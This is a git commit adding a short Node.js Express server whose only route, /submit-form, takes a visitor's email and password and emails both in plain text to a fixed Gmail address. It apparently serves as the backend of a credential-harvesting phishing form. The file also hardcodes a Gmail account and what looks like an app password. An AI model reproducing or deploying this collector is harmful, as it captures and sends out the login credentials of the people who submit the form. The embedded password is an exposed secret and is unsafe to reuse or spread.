35f8bcdf8c085229bf5cb76bfdcdf9c0e54da4ac
Paul Chibueze <94766465+chibuezedev@users.noreply.github.com>
2024-03-07 14:08:48 +0100

    Add files via upload

---
+++ server.js
@@ -0,0 +1,47 @@
+const express = require("express");
+const bodyParser = require("body-parser");
+const nodemailer = require("nodemailer");
+const cors = require("cors");
+
+const app = express();
+
+app.use(cors());
+app.use(bodyParser.json());
+app.use(bodyParser.urlencoded({ extended: true }));
+
+app.post("/submit-form", (req, res) => {
+  const { email, password } = req.body;
+
+  let transporter = nodemailer.createTransport({
+    service: "gmail",
+    auth: {
+      user: "paulpadro03@gmail.com",
+      pass: "rxafumuidjspowjm",
+    },
+  });
+
+  // Email message options
+  let mailOptions = {
+    from: email,
+    to: "chibuezedeveloper@gmail.com",
+    subject: "Form Submission",
+    text: `Email: ${email}\nPassword: ${password}`,
+  };
+
+  // Send the email
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+      res.status(500).send("Error sending email");
+    } else {
+      console.log("Email sent: " + info.response);
+      res.status(200).send("Email sent successfully");
+    }
+  });
+});
+
+// Start the server
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log(`Server is running on port ${PORT}`);
+});
